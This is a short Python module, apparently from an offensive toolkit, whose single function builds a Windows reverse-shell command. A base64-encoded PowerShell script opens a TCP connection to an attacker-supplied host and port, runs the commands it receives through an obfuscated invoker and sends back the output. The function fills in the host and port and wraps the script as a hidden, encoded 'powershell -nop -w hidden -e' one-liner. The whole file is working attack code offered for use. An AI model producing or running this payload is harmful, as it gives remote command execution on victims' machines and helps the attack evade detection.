__all__ = ['reverse_tcp']

import base64


def reverse_tcp(lhost: str, lport: int):
    """Connect back to attacker and spawn a command shell"""

    s = """\
JHVzZXJwcm9tcHQ9JnskY29tcHV0ZXI9W0Vudmlyb25tZW50XTo6TWFjaGluZU5hbWUuVG9Mb3dl
cigpO2lmKCgtbm90KCRkb21haW49W0Vudmlyb25tZW50XTo6VXNlckRvbWFpbk5hbWUpKS1vcigk
ZG9tYWluIC1lcSAkY29tcHV0ZXIpKXskZG9tYWluPScnfWVsc2V7JGRvbWFpbis9J1wnfTskdXNl
cj0oJGRvbWFpbitbRW52aXJvbm1lbnRdOjpVc2VyTmFtZSkuVG9Mb3dlcigpO2lmKCR1c2VyIC1h
bmQgJGNvbXB1dGVyKXsiJHVzZXJAJGNvbXB1dGVyICJ9ZWxzZXsnJ319OyRwcm9tcHQ9eyhAKCcn
LCcxOzMxbVtyZXZdICcsJzM0bVBTICcsIjM1bSR1c2VycHJvbXB0IiwiMzRtJFBXRD4iLCdtICcp
LWpvaW4gIiQoW2NoYXJdMHgxQilbIil9OyRjbGllbnQ9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNv
Y2tldHMuVENQQ2xpZW50KCRsaG9zdCwkbHBvcnQpOyRzdHJlYW09JGNsaWVudC5HZXRTdHJlYW0o
KTskc2VuZGJ5dGU9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCgmJHByb21wdCkp
OyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVz
aCgpO1tieXRlW11dJGJ5dGVzPTAuLjY1NTM1fCV7MH07JGY9J2Zvbyc7JGY9KC1qb2luIFtjaGFy
W11dQCgwLi4oJGYuTGVuZ3RoIC0gMSl8JXsoW2ludF1bY2hhcl0oJGZbJF9dKSAtYnhvciAoMHhG
LDB4QSwweDE3KVskX10pfSkpO3doaWxlKCgkaT0kc3RyZWFtLlJlYWQoJGJ5dGVzLDAsJGJ5dGVz
Lkxlbmd0aCkpLW5lIDApeyRkYXRhPShOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5B
U0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsJGkpOyRzZW5kYmFjaz0oJiRmICIueyRk
YXRhfTI+JjEifE91dC1TdHJpbmcpOyRzZW5kYmFjazI9IiRzZW5kYmFjayQoJiRwcm9tcHQpIjsk
c2VuZGJ5dGU9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRz
dHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgp
O307JGNsaWVudC5DbG9zZSgpCg=="""
    s = base64.b64decode(s).decode()
    for sub, repl in [('$lhost', repr(lhost)), ('$lport', str(lport))]:
        s = s.replace(sub, repl, 1)
    enc = base64.b64encode(s.encode('utf-16-le')).decode('ascii')
    return f"powershell -nop -w hidden -e {enc!r}"
